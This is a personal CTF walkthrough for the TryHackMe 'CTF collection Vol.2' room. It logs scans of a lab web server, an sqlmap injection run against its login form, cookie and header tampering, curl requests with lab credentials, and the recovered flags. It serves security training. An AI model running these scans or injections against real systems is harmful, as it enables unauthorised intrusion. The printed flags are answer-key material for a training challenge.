@@ -1,0 +1,328 @@
+Name: CTF collection Vol.2
+Date: 25/01/2022
+Difficulty: Medium
+Description: Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.
+Better Description: Have both eyes poked out by one websites self-hatred at its creator, the awesome DesKel.
+Goals: Improve my webhacking, still have admiration for everything that DesKel has every helped me with in terms of writeups and THM rooms
+Learnt: CURL YOUR WAY TO VICTORY
+
+
+RECOMMEND JUST LOOKING AT THE WEBSITE IN PURE SOURCE AS YOUR EYES WILL MELT.
+
+
+
+nmap -sC -sV -O -T 4 -p- 10.10.178.211                                                                                
+[sudo] password for nvm: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 16:33 GMT
+Nmap scan report for 10.10.178.211
+Host is up (0.057s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
+|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
+|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
+|_http-title: 360 No Scope!
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=1/25%OT=22%CT=1%CU=39712%PV=Y%DS=2%DC=I%G=Y%TM=61F026C
+OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SEQ
+OS:(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O
+OS:3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=
+OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 131.89 seconds
+
+nikto -h 10.10.178.211                                                                                                   127 ⨯
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.178.211
++ Target Hostname:    10.10.178.211
++ Target Port:        80
++ Start Time:         2022-01-25 16:34:24 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'busted' found, with contents: Hey, you found me, take this Easter 6: THM{}
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie Invited created without the httponly flag
++ Server may leak inodes via ETags, header found with file /robots.txt, inode: 918959, size: 430, mtime: Mon Jan  6 07:41:24 2020
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /login/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8700 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2022-01-25 16:46:01 (GMT0) (697 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+gobuster dir -u http://10.10.178.211 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.178.211
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/01/25 16:35:01 Starting gobuster in directory enumeration mode
+===============================================================
+/index                (Status: 200) [Size: 94328]
+/login                (Status: 301) [Size: 314] [--> http://10.10.178.211/login/]
+/button               (Status: 200) [Size: 39148]                                
+/static               (Status: 200) [Size: 253890]                               
+/cat                  (Status: 200) [Size: 62048]                                
+/small                (Status: 200) [Size: 689]                                  
+/who                  (Status: 200) [Size: 3847428]                              
+/robots               (Status: 200) [Size: 430]                                  
+/iphone               (Status: 200) [Size: 19867]                                
+/game1                (Status: 301) [Size: 314] [--> http://10.10.178.211/game1/]
+/egg                  (Status: 200) [Size: 25557]                                
+/dinner               (Status: 200) [Size: 1264533]                              
+/ty                   (Status: 200) [Size: 198518]                               
+/ready                (Status: 301) [Size: 314] [--> http://10.10.178.211/ready/]
+/saw                  (Status: 200) [Size: 156274]                               
+/game2                (Status: 301) [Size: 314] [--> http://10.10.178.211/game2/]
+/wel                  (Status: 200) [Size: 155758]                               
+/free_sub             (Status: 301) [Size: 317] [--> http://10.10.178.211/free_sub/]
+/nicole               (Status: 200) [Size: 367650]                                  
+/server-status        (Status: 403) [Size: 294]                                     
+                                                                                    
+===============================================================
+2022/01/25 17:00:29 Finished
+
+
+/robots.txt
+User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
+Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
+
+#AND A FLAG HERE
+
+
+# Egg 1
+view-source:http://10.10.178.211/robots.txt
+45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
+
+#  Egg 2 is HARD
+
+Thank you: https://sckull.github.io/posts/ctf_collection_vol2/
+
+I got lost by not decoding the URL
+fromb64->decodeURL->fromb64->removeWhiteSpace->base64->removeWhiteSpace->fromb64
+view-source:http://10.10.178.211/DesKel_secret_base/
+
+
+# Egg 3
+view-source:http://10.10.178.211/login/
+<p hidden>Seriously! You think the php script inside the source code? Pfff.. take this easter 3
+
+# Egg 4 
+
+sqlmap -r login -a
+
+THM_f0und_m3 database
+nothing_inside table
+
+# Egg5 
+
+THM_f0und_m3 database
+md5 hash
+05f3672ba34409136aa71b8d00070d1b 
+
+
+# Egg 6
+
+HTTP/1.1 200 OK
+Date: Tue, 25 Jan 2022 16:35:22 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.26
+Busted: Hey, you found me, take this Easter 6: THM{}
+Vary: Accept-Encoding
+Content-Type: text/html
+
+# Egg 7
+Set ages trying different IDOR cookie stuff, read up:
+https://fr33s0ul.tech/ctfcollectionvol2-write-up/
+
+GET / HTTP/1.1
+Host: 10.10.178.211
+User-Agent: User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: Invited=1; egg=YES                      ###<-Change from YES to 1 
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+Scroll to:
+You are now officially invited. Enjoy the easter 7:
+
+# Egg 8
+Change User-Agent:
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
+
+You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8:
+
+# Egg 9
+
+view-source:http://10.10.178.211/ready/
+<!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{
+
+# Egg 10
+
+https://fr33s0ul.tech/ctfcollectionvol2-write-up/
+Didn't realise it was on the /free_sub/ page :(
+Referer: tryhackme.com
+
+# Egg 11
+
+deskellike noddy, the little man in the red and yellow car, likes eggs
+curl -X POST -d 'dinner=egg&submit=submit' http://10.10.179.215 -o egg11.html
+
+
+# Egg 12
+view-source:http://10.10.178.211/jquery-9.1.2.js
+decode the hex 4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d
+
+# Egg 13
+
+http://10.10.178.211/ready/gone.php
+
+# Egg 14
+view-source:http://$IP/
+<!--Easter 14<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAAMgCAYAAADbcA ...
+
+stegoveritas pic.png                       
+Running Module: MultiHandler
+
+Exif
+====
++---------------------+------------------------------------------------------------+
+| key                 | value                                                      |
++---------------------+------------------------------------------------------------+
+| SourceFile          | /home/nvm/tryhackmeCourse/CTFs/CTFcollectionVoltwo/pic.png |
+| ExifToolVersion     | 12.39                                                      |
+| FileName            | pic.png                                                    |
+| Directory           | /home/nvm/tryhackmeCourse/CTFs/CTFcollectionVoltwo         |
+| FileSize            | 89 KiB                                                     |
+| FileModifyDate      | 2022:01:25 16:42:56+00:00                                  |
+| FileAccessDate      | 2022:01:25 16:43:03+00:00                                  |
+| FileInodeChangeDate | 2022:01:25 16:42:56+00:00                                  |
+| FilePermissions     | -rw-r--r--                                                 |
+| FileType            | TXT                                                        |
+| FileTypeExtension   | txt                                                        |
+| MIMEType            | text/plain                                                 |
+| MIMEEncoding        | utf-8                                                      |
+| ByteOrderMark       | No                                                         |
+| Newlines            | Unix LF                                                    |
+| LineCount           | 615                                                        |
+| WordCount           | 1469                                                       |
++---------------------+------------------------------------------------------------+
+Found something worth keeping!
+Unicode text, UTF-8 text, with very long lines (911)
+
+Forgot you code convert to image format on cyberchef
+base64-> convert to image format
+
+# Egg 15
+
+Either use bruteforce it with burp
+or
+
+Input these: map to the hint!
+qwertyui
+opl
+asdf
+ghjk
+zxcvbnM
+
+QWERTYUI
+OPL
+SADF
+GHJK
+ZXCVBNM
+
+GameOver
+
+# Egg 16
+
+NOTE TO SELF AND ANYONE WHO READS ANY OF THESE I HAVE HAD LONG BATTLE WITH CURL COMMAND
+CURL IS MINE! FIRST TIME! VERY HAPPY! :)
+
+curl -d "button1=submit&button2=submit&button3=submit" http:///10.10.178.211/game2/ 
+<html>
+        <head>
+                <title>Game 2</title>
+                <h1>Press the button simultaneously</h1>
+        </head>
+        <body>
+
+        <form method="POST">
+                <input type="hidden" name="button1" value="button1">
+                <button name="submit" value="submit">Button 1</button>
+        </form>
+
+        <form method="POST">
+                <input type="hidden" name="button2" value="button2">
+                <button name="submit" value="submit">Button 2</button>
+        </form>
+
+        <form method="POST">
+                <input type="hidden" name="button3" value="button3">
+                <button name="submit" value="submit">Button 3</button>
+        </form>
+        Just temper the code and you are good to go. Easter 16: THM{xxxxx}    </body>
+</html>
+
+
+
+# Egg 17
+HINTISWRONG YOU WILL GET WHITESPACED DELIMITED DECIMALS BEWARE!
+bin -> hex -> ascii
+https://www.rapidtables.com/convert/number/binary-to-hex.html
+https://www.rapidtables.com/convert/number/hex-to-ascii.html
+
+        <!--! Easter 17-->
+        <button onclick="nyan()">Mulfunction button</button><br>
+        <p id="nyan"></p>
+# Egg 18
+burp
+POST /
+
+egg: YES        # NOT egg:YES ...
+
+# Egg 19
+
+view-source:http://10.10.178.211/small.png
+
+# Egg 20
+
+curl -X POST -d 'username=DesKel&password=heisDumb' http://10.10.179.215 -o egg20.html
